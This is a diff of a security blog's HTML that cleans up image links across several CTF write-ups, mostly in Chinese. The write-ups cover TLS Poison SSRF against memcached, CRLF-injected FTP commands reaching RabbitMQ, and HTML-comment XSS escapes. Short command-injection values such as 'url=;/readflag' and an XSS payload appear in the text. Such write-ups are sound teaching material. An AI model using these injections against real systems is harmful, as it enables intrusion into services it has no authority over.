 &lt;p>我们可以清楚的看到在显式 FTPS 在使用&lt;code>AUTH SSL&lt;/code>命令之后才与服务器建立的 TLS 连接，并在&lt;code>LIST&lt;/code>之后我们可以看到重新使用了 TLS Session 。&lt;/p>
 &lt;p>这里我们简单回顾一下，在利用 HTTPS 进行 TLS Poison 时，我们需要再次使用 HTTP 重定向让客户端重新与我们建立会话，但是仔细观察 FTPS ，我们并没有使用类似 HTTPS 重定向的功能让其再次与 FTPS 服务器建立连接，那为什么我们只是简单访问一次 FTPS 服务器就会产生会话重用的现象呢？&lt;/p>
 &lt;p>让我们看之前发生了什么，客户端使用了&lt;code>EPSV&lt;/code>命令表示使用 FTP 被动模式，FTP 服务器以&lt;code>(||||32949)&lt;/code>对该命令进行了回复。&lt;/p>
 &lt;p>这里我们简单回顾一下 FTP 的被动模式：在被动模式的 FTP 中，客户端启动到服务器的两个连接，&lt;strong>解决了防火墙阻止从服务器到客户端的传入数据端口连接的问题&lt;/strong>。FTP 连接建立后，客户端在本地打开两个随机的非系统端口 N 和 N + 1(N &amp;gt; 1023)。第一个端口连接服务器上的 21 端口，但是客户端这次将会发出 PASV 命令，也就是不允许服务器连接回其数据端口。这样，服务器随后会打开一个随机的非系统端口 P (P &amp;gt; 1023)，并将 P 发送给客户端作为 PASV 命令的响应。然后客户端启动从端口 N+1 到端口 P 的连接来传输数据。其中&lt;code>EPSV&lt;/code>命令为&lt;code>PASV&lt;/code>的更新版本，主要为了兼容 IPv6 而在 RFC 2428 中定义的。&lt;/p>
-&lt;p>Permalink before if: https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png&lt;img src="https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png"
+&lt;p>&lt;img src="https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以在被动模式中，我们可以借由上图清楚的明白，在数据传输阶段，客户端需要与服务端重新建立一次连接！而在显式 FTPS 当中，重新建立连接就可以重新使用 TLS 会话，也就意味着可能被 TLS Poison 攻击！&lt;/p>
@@ -2988,7 +2988,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里我另外增加了&lt;code>--tls-max 1.2&lt;/code>选项，因为在 TLS 1.3 当中， Session ID 传输在加密过程中，不便观察，而 TLS 1.2 可以在 Server Hello 消息中看到 TLS Server 设置的 Session ID，所以这里我们使用&lt;code>--tls-max 1.2&lt;/code>迫使 curl 最大使用 TLS 1.2 版本。&lt;/p>
 &lt;p>我们就可以观察到如下图所示现象：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到也是在使用&lt;code>PASV&lt;/code>命令之后，也就是数据传输阶段时，重新使用了 Session ID 进行建立 TLS 会话。&lt;/p>
@@ -3153,7 +3153,7 @@ loading="lazy"
 &lt;/li>
 &lt;/ul>
 &lt;p>整个代码流程如下图所示：&lt;/p>
-&lt;p>Permalink before if: https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png&lt;img src="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png"
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="solution-1">Solution 1
@@ -3161,7 +3161,7 @@ loading="lazy"
 >https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner&lt;/a>&lt;/p>
 &lt;p>我们先来看看第一种解法，这也是 perfect guesser 他们使用的类似解法，通过 HTTPS 来进行解题。&lt;/p>
 &lt;p>题目唯一一处可以让我们直接执行命令的地方就是&lt;code>exec&lt;/code>处了，所以如果没有其他校验验证的话，我们可以直接使用命令注入进行 RCE ，例如传入&lt;code>url=;/readflag&lt;/code>，这样题目执行顺序如下流程图所示：&lt;/p>
-&lt;p>Permalink before if: https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png&lt;img src="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png"
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这样题目在执行我们的命令时，就也会把回显显示给我们了，也就拿到 FLAG 了。&lt;/p>
@@ -3174,7 +3174,7 @@ loading="lazy"
 &lt;p>既然是要写入 memcached 我们不难想到 2020 年 black hat 上的议题 When TLS Hack You ，其中作者使用的 demo 就是通过 TLS 配合 DNS Rebinding 来对 memcached 发起 SSRF 攻击，所以如何将我们的 payload 写入到 memcached 当中基本有了个大致的思路，问题是如何实现利用这个思路呢？&lt;/p>
 &lt;p>我们再来看看如果真是使用 TLS Poison 攻击的话，使用 HTTPS 是不是就可以满足以上两个限制的条件了呢？确实如此，&lt;code>https://&lt;/code>并没有使用其他禁止的字符，并且我们可以通过 HTTPS 让题目的&lt;code>file_get_contents&lt;/code>得到任意内容，包括满足他所需要的&lt;code>001e# service=git-upload-pack\n&lt;/code>这个条件。&lt;/p>
 &lt;p>所以似乎看起来 TLS Poison 正是这个题目的关键！如果是这样的话，接下来我们就需要确定，我们应该使用 &lt;code>file_get_contents&lt;/code>还是 git 来进行操作呢？也就是说哪一个支持 TLS 会话重用这个特性呢？我们知道&lt;code>file_get_contents&lt;/code>并没有依赖 libcurl ，我们如果直接查看 PHP 源代码有点麻烦，不如直接通过让其访问我们 TLS Poison Demo 来测试，如果能有支持 TLS 会话重用，在 302 时，也就是第二次访问我们 TLS Server 即会带上 Session ID ，这个我们可以直接用wireshark 本地抓包即可看到了。但是经过测试其实我们可以看到&lt;code>file_get_contents&lt;/code>并没有在第二次 TLS 会话时重用 Session ID，如图所示：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以接下来我们就只能寄希望于 git 了，那么 git 是否支持 TLS 重用会话？怎么确定 git 是否支持 TLS 会话重用呢？我们能不能确定 git 使用的是什么网络请求资源依赖库呢？比如 libcurl ？如果是 libcurl ，我们就好办了，因为明确知道 libcurl 对于 HTTPS 的支持是可以支持会话重用的，至少对于 OpenSSL 或者 GnuTLS 来说，都是支持此项特性的。&lt;/p>
@@ -3205,7 +3205,7 @@ loading="lazy"
 &lt;li>那怎么实施 TLS Poison 呢？部署 HTTPS Server ，先绕过之前两个限制，在 git 请求 HTTPS Server 的时候实行 TLS Poison&lt;/li>
 &lt;/ol>
 &lt;p>具体流程图如下：&lt;/p>
-&lt;p>Permalink before if: https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png&lt;img src="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png"
+&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>其中我们可以使用双 A 记录的方法来优化 DNS Rebinding 方式，具体关于 TLS Poison 详细解释见：&lt;a class="link" href="https://zeddyu.github.io/2021/04/20/tls-poison/" target="_blank" rel="noopener"
@@ -3263,7 +3263,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里因为题目设置了 sandbox ，占用了 10 字节，而 TLS 1.2 中的 SessionID 局限于 32 字节，所以我们没办法直接使用&lt;code>;/readflag&lt;/code>，否则会超出长度，直接使用&lt;code>;/r*&lt;/code>也可以执行读取 flag 命令。最后打包整理的 Exp 放在：https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1&lt;/p>
 &lt;p>在自己的服务器上搭建好 TLS 服务器之后，最后用 exp.py 自动发包就能拿到 flag 了：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="solution-2">Solution 2
@@ -3290,7 +3290,7 @@ loading="lazy"
 &lt;p>&lt;strong>PS：这里 FTP 服务记得要完整实现对 PASV 之后的命令处理，否则攻击失败。&lt;/strong>&lt;/p>
 &lt;p>天知道这个坑了我多久&amp;hellip;当时死活都不能复现，问作者 0xbb 也不知道什么情况，又是排 curl 版本，又是排 git 版本，又是排 OpenSSL ，又是排 GnuTLS ，反正各种排 bug ，万念俱灰，最后才找到这个地方&amp;hellip;简直&lt;/p>
 &lt;p>这里我自己编译了一个存在&lt;code>pasv&lt;/code>漏洞的 curl 调试，访问我们的 ftps 服务器之后就会对我们 127.0.0.1:11211 进行 TLS 会话重用，就会将我们的 payload 发送到 11211 端口了：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>写入之后基本上就没有什么问题了。&lt;/p>
@@ -3328,7 +3328,7 @@ loading="lazy"
 &lt;/li>
 &lt;/ul>
 &lt;p>至此，完成这个题目的 FTPS 解法。exp 效果图如下：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="something-else">Something else
@@ -3433,20 +3433,20 @@ loading="lazy"
 &lt;p>后面才知道我上传的文件是修改了我们每次下注的积分，因为初始的时候每个队都一样，一次把自家身家200一次下完，而输的概率又很大，基本立马就出局了，然而通过一开始直接下注 1 个积分，这样就可以立马稳住战局，至少可以不会立马出局就可以排前五上分了。于是我们一开始就在 KOH 上分了，就这样通过 KOH 得分，我们稳住了前一天的排名，第一天的得分也就基本全都来自于 KOH 。&lt;/p>
 &lt;h2 id="shift-2--shift-3">Shift 2 &amp;amp; Shift 3
 &lt;/h2>&lt;p>由于时间也比较久远了，我记的不是特别清楚，这两个 Shift 就放一起了。由于之前貌似大家没怎么打 DEFCON QUALS 或者说打了的师傅这次 Final 没打？我们一开始并没有发现 KOH 那个题是改自 DEFCON QUALS Fountain OOO REliving ，是一个 Golly 相关的逆向题，当时看 QUALS 的 WriteUp 也是相当崩溃的，由于我这个小菜鸡没什么逆向基础，跟某师傅硬着头皮搞也没怎么搞出来，而这个还是升级版，当时看这个题目的附件图还是一脸懵逼的：&lt;/p>
-&lt;p>Permalink before if: https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true&lt;img src="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true"
+&lt;p>&lt;img src="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true"
 loading="lazy"
 >&lt;/p>
 &lt;p>在 Golly 上瞎弄更是相当懵逼。虽然逆向帮不上啥，但是我还是每个 ROUND 都看一看各个队伍的表现以及策略，然后发现感觉也可能是一个数学期望题（？），我就尝试着算一下每次下注多少才能让我们每个 ROUND 大概率能在现有的队伍策略中胜出，然后通过不断的试不断的改，后面基本上靠运气能拿下不少分（&lt;/p>
 &lt;p>后面我们 AWD 分数也起来了，截止到 Shift 2 结束，我截了一张当时的图。（看着当时的 KOH 感觉当时运气真好&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>后面在 Shift 3 的时候，这个 21 点的题目一开始没多久就下了，于是我又开始混起来了，也就随便看看平台，然后看看队友们在干啥，中间貌似有一个 RPG 游戏的 AWD 题目，当时看他们玩起来感觉很有意思，就是大家通过操控自己的角色进行对应的操作拿 Flag ，而且还是具有一定实时操作性，总之看起来他们在打这个游戏非常有意思 XD&lt;/p>
 &lt;p>然后后面又放了两个 KOH ，一个是非常 Geek 的弹球游戏，还有一个是开飞船打飞船的游戏，两个都是逆向，也让我混的是理直气壮（大雾），虽然我想尽可能地帮忙，但是真是菜的真实，也就到处看看有什么可以帮忙的地方，比如，拿外卖（海盗虾饭外卖是真好吃，泡面真香，好久没吃泡面了，呜呜呜TAT）&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>是我本人没错了（&lt;/p>
@@ -3465,7 +3465,7 @@ loading="lazy"
 &lt;p>后面封榜然后到结束，基本就没有什么操作了，封榜前我看了一下分数差距，我觉得我们是应该跟 HITCON 争第三，PPP 跟 A0E 抢第一。&lt;/p>
 &lt;p>结束之后，虽然窗外的阳光格外的刺眼，北京早高峰伴随着汽车的鸣笛已经纷至沓来，但是室内我们比较平静，大家都收拾收拾东西，捡了捡垃圾方便阿姨打扫，随便聊了聊看了看其他队对于这次比赛的吐槽，然后就都各自回去休息了。我回去后开着 DEFCON 直播等了好一会，发现他们还挺磨蹭的，顺便洗了个澡，回来等待着揭晓最终结果。&lt;/p>
 &lt;p>后面公布榜单，得知我们是拿到了第四名，自己倒也没有什么特别的心情，知道之后也就整理整理这两天的题目，看了看大家对于这次比赛的评论，之后就睡了。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg"
 loading="lazy"
 >&lt;/p>
 &lt;p>倒是在揭晓一二名的时候，主办方应该是特地做了一个分数动态图来显示最后比赛的激烈，烘托一下紧张的氛围，最后显示 A0E 以 2 分的优势险胜 PPP 拿到了冠军，也意味着刷新了中国大陆战队在 DEFCON CTF 上取得的最好的成绩，也算谁见证了一次历史吧 XD&lt;/p>
@@ -3540,12 +3540,12 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>比较熟悉的同学可以一眼就看看到问题所在了。&lt;/p>
 &lt;p>由于官方提供的是整场比赛所有的流量包过大，并没有具体分类，整个流量包多达 200 GB ，而且对于 Web 题目来说，基本几个流量包就能拿到大多数的 Payload 了，所以我拿了我手头上当时下载的基本分部了大多数时间段的流量包，提取了一下 HTTP 流量并进行了简单统计处理，并按照出现的次数进行了从高到低的排序，得到了以下的结果：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>奇怪，中间好像混入了什么奇怪的东西（&lt;/p>
 &lt;p>当然其他流量包或许还可能存在一些其他的 Payload ，但是基本该题所有的点都在这了。并且每个流量包都充斥着大量的垃圾流量，接下来就是垃圾流量大赏，原来你就是中国文化宣传大使？不用我多说就知道了吧，跟某个师傅打过 AWD 的都应该知道是谁发的这些垃圾流量。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="require">Require
@@ -4684,19 +4684,19 @@ loading="lazy"
 &lt;ol>
 &lt;li>
 &lt;p>登录失败的时候会直接无过滤地回显用户名，这里有一处 HTML 注入&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423014836.png"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>在提交 issue 处，有一项需要提交 image URL 的地方也存在着 HTML 注入&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200423021048.png"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>题目设置还会利用 session 来存储一些 HTML 元素，例如我们在同一个 session 先登录，再用这个 session 发送一个登录失败的请求，刷新我们已登录的页面我们就可以看到：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424222148.png"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
@@ -4947,7 +4947,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;/blockquote>
 &lt;p>所以我们只需要在页面加入一个&lt;code>&amp;lt;em&amp;gt;&lt;/code>标签，即可把内容拆分为单个字母，效果如下：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200424182529.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以这时候我们就可以利用&lt;code>#:~:text=P-,C,T,-F&lt;/code>进行选中了。&lt;/p>
@@ -5451,7 +5451,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>但是我并没有在 uBlock 看到相关的配置，&lt;code>postMessage&lt;/code>都是使用的默认配置，然后关于默认配置我也查看了部分 Chromium 的源码，对于 UserActivation 默认配置是 false 的&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是我们通过 &lt;a class="link" href="#Verification" >Verification&lt;/a> 环节测试得到的结果确实需要 uBlock 来进行，由于自己时间并不是特别多，最近花太多时间在这题的复盘上，所以最近不打算再深究这部分的内容了，这部分的内容不仅涉及到 User Activation ，还涉及到一些关于 User Activation 抽象模型的代码实现，如果要深究的话就需要花比较多的时间了。&lt;/p>
@@ -5537,8 +5537,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>This url will make a request like this.&lt;/p>
-&lt;p>Permalink before if: /1.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1.png"
 width="1136"
 height="1060"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1_hu4319291633957421324.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1_hu18005833859049484385.png 1024w"
@@ -5557,8 +5556,7 @@ data-flex-basis="257px"
 &lt;p>In &lt;em>passive&lt;/em> mode, the client establishes &lt;em>both&lt;/em> channels. We already know it establishes the command channel in active mode and it does the same here.&lt;/p>
 &lt;/blockquote>
 &lt;p>If we don&amp;rsquo;t inject code through CRLF, we can get the FTP traffic like this:&lt;/p>
-&lt;p>Permalink before if: /2.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/2.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/2.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/2.png"
 width="1044"
 height="784"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/2_hu1148410208877913323.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/2_hu6767240057083691703.png 1024w"
@@ -5570,8 +5568,7 @@ data-flex-basis="319px"
 &lt;p>So it will use &lt;code>PASV&lt;/code> command to open passive mode and build a connection with client.&lt;/p>
 &lt;p>Why not inject &lt;code>PORT&lt;/code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?&lt;/p>
 &lt;p>Yeah. Just like this. I use &lt;code>PORT&lt;/code> command to let ftp-srv connect with my server.&lt;/p>
-&lt;p>Permalink before if: /1.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1.png"
 width="1136"
 height="1060"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1_hu4319291633957421324.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/1_hu18005833859049484385.png 1024w"
@@ -5704,8 +5701,7 @@ data-flex-basis="257px"
 &lt;/h2>&lt;p>The last key to solve this problem is let the ftp server send a http request to rabbitmq server.&lt;/p>
 &lt;p>But how?&lt;/p>
 &lt;p>We notice that we can hide a http message in the profile png and use &lt;code>RRETR&lt;/code> to let the ftp server return the message of png.&lt;/p>
-&lt;p>Permalink before if: /3.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3.png"
 width="2144"
 height="990"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3_hu4726260500021086370.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3_hu17443567440403927909.png 1024w"
@@ -5742,8 +5738,7 @@ data-flex-basis="519px"
 &lt;p>{% twitter &lt;a class="link" href="https://twitter.com/zwad3/status/1252087190278082562" target="_blank" rel="noopener"
 >https://twitter.com/zwad3/status/1252087190278082562&lt;/a> %}&lt;/p>
 &lt;p>He mentioned we should send the real request followed by 50,000 dumb requests (in one file). I tried this method today and this really gave 100% success rate.&lt;/p>
-&lt;p>Permalink before if: /3.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3.png"
 width="2144"
 height="990"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3_hu4726260500021086370.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/3_hu17443567440403927909.png 1024w"
@@ -5753,8 +5748,7 @@ data-flex-grow="216"
 data-flex-basis="519px"
 >&lt;/p>
 &lt;p>Just like this, I put 1000 http get requests in one file and every time can get flag.&lt;/p>
-&lt;p>Permalink before if: /4.png
-Permalink after reassignment: https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/4.png&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/4.png"
+&lt;p>&lt;img src="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/4.png"
 width="832"
 height="486"
 srcset="https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/4_hu1383566469765219018.png 480w, https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///p/plaid-ctf-2020-contrived-web-problem-write-up/4_hu12810089339028369329.png 1024w"
@@ -5815,7 +5809,7 @@ data-flex-basis="410px"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">--&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">svg&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">onload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">alert&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png"
+&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是这里我们并不能直接传入 HTML 编码绕过，得需要加一个 img 标签利用其属性进行绕过，为什么呢？&lt;/p>
@@ -5874,11 +5868,11 @@ loading="lazy"
 >data state&lt;/a>，也就是结束了注释解析状态回到了最开始的 HTML 解析状态，这样就导致我们就成功逃逸了注释符。&lt;/p>
 &lt;h3 id="difficult-version">Difficult Version
 &lt;/h3>&lt;p>再过滤了实体编码&lt;code>&amp;amp;#;&lt;/code>之后我们要怎么绕过呢？我们先给出一个 Trick ，在这里我们可以使用&lt;code>&amp;lt;?&lt;/code>进行绕过。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到我们在使用了&lt;code>&amp;lt;?&lt;/code>之后成功把 p 标签逃逸了出来，可是为什么呢？我们可以输出第一步的&lt;code>template.innerHTML&lt;/code>看看&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png"
